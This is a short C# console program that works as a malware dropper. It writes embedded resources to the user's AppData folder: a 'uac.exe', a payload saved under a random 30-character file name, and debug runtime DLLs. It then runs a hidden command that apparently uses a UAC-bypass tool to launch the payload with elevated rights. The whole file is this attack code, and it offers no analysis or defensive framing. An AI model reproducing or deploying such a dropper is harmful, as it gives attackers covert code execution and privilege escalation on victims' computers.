using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using ConsoleApp2.Properties;

namespace ConsoleApp2;

internal class Program
{
	public string crearnombre(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void Main(string[] args)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (File.Exists(folderPath + "\\uac_location"))
		{
			File.Delete(folderPath + "\\uac_location");
		}
		Program program = new Program();
		string text = program.crearnombre(30);
		string location = Assembly.GetEntryAssembly()!.Location;
		string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(location);
		File.WriteAllText(folderPath + "\\uac_location", location);
		File.WriteAllBytes(folderPath + "\\uac.exe", Resources.uac);
		File.WriteAllBytes(folderPath + "\\" + text + ".exe", Resources.slam);
		File.WriteAllBytes(folderPath + "\\ucrtbased.dll", Resources.ucrtbased);
		File.WriteAllBytes(folderPath + "\\vcruntime140d.dll", Resources.vcruntime140d);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c cd %appdata% & uac.exe 34 " + folderPath + "\\" + text + ".exe";
		Process.Start(processStartInfo);
	}
}
